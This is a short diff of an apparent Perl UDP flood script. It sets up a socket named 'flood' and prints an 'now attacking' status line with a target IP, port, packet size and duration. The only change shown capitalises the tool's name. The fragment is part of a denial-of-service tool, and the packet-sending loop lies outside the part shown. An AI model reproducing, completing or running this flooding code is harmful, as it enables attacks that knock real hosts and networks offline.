@@ -35,7 +35,7 @@ $endtime = time() + ($time ? $time : 1000000);
 
 socket (flood, PF_INET, SOCK_DGRAM, 17);
 
-print "equinox - now attacking: $ip" . ($port ? $port : " random") . " port with " .
+print "Equinox - now attacking: $ip" . ($port ? $port : " random") . " port with " .
 ($psize ? "$size-byte" : "random size ") . "packets" .
 ($time ? " for $time seconds" : "") . "\n";
 print "Break with Ctrl-C\n" unless $time;
